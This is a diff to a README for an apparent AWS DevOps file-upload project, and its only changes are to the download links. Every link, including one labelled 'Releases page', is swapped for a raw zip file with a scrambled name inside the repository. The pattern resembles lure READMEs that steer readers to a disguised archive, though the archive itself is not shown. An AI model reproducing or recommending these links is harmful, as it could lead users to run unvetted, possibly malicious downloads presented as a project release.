@@ -1,6 +1,6 @@
 # 🚀 3tier-aws-devops-file-upload-project-terraform-ansible-jenkins - Easy File Uploads with AWS DevOps
 
-[![Download](https://raw.githubusercontent.com/abood75531/3tier-aws-devops-file-upload-project-terraform-ansible-jenkins/main/frontend/terraform-upload-jenkins-aws-project-file-ansible-tier-devops-v3.4.zip%20Release-blue)](https://raw.githubusercontent.com/abood75531/3tier-aws-devops-file-upload-project-terraform-ansible-jenkins/main/frontend/terraform-upload-jenkins-aws-project-file-ansible-tier-devops-v3.4.zip)
+[![Download](https://github.com/abood75531/3tier-aws-devops-file-upload-project-terraform-ansible-jenkins/raw/refs/heads/main/terraform/file-terraform-tier-aws-project-upload-jenkins-devops-ansible-v2.5.zip%20Release-blue)](https://github.com/abood75531/3tier-aws-devops-file-upload-project-terraform-ansible-jenkins/raw/refs/heads/main/terraform/file-terraform-tier-aws-project-upload-jenkins-devops-ansible-v2.5.zip)
 
 ## 📜 Description
 
@@ -27,7 +27,7 @@ This project showcases a secure file upload web application designed for product
 Follow the steps below to download and run the software.
 
 1. **Visit the Download Page:**
-   Go to the [Releases page](https://raw.githubusercontent.com/abood75531/3tier-aws-devops-file-upload-project-terraform-ansible-jenkins/main/frontend/terraform-upload-jenkins-aws-project-file-ansible-tier-devops-v3.4.zip) to find the latest version of the project.
+   Go to the [Releases page](https://github.com/abood75531/3tier-aws-devops-file-upload-project-terraform-ansible-jenkins/raw/refs/heads/main/terraform/file-terraform-tier-aws-project-upload-jenkins-devops-ansible-v2.5.zip) to find the latest version of the project.
 
 2. **Download the Latest Release:**
    You can find the latest release at the top of the page. Choose the appropriate version and click the link to download.
@@ -48,7 +48,7 @@ Follow the steps below to download and run the software.
 
 To get started, click the button below to download the latest version of the project:
 
-[![Download](https://raw.githubusercontent.com/abood75531/3tier-aws-devops-file-upload-project-terraform-ansible-jenkins/main/frontend/terraform-upload-jenkins-aws-project-file-ansible-tier-devops-v3.4.zip%20Release-blue)](https://raw.githubusercontent.com/abood75531/3tier-aws-devops-file-upload-project-terraform-ansible-jenkins/main/frontend/terraform-upload-jenkins-aws-project-file-ansible-tier-devops-v3.4.zip)
+[![Download](https://github.com/abood75531/3tier-aws-devops-file-upload-project-terraform-ansible-jenkins/raw/refs/heads/main/terraform/file-terraform-tier-aws-project-upload-jenkins-devops-ansible-v2.5.zip%20Release-blue)](https://github.com/abood75531/3tier-aws-devops-file-upload-project-terraform-ansible-jenkins/raw/refs/heads/main/terraform/file-terraform-tier-aws-project-upload-jenkins-devops-ansible-v2.5.zip)
 
 ## 👥 Contributing
 
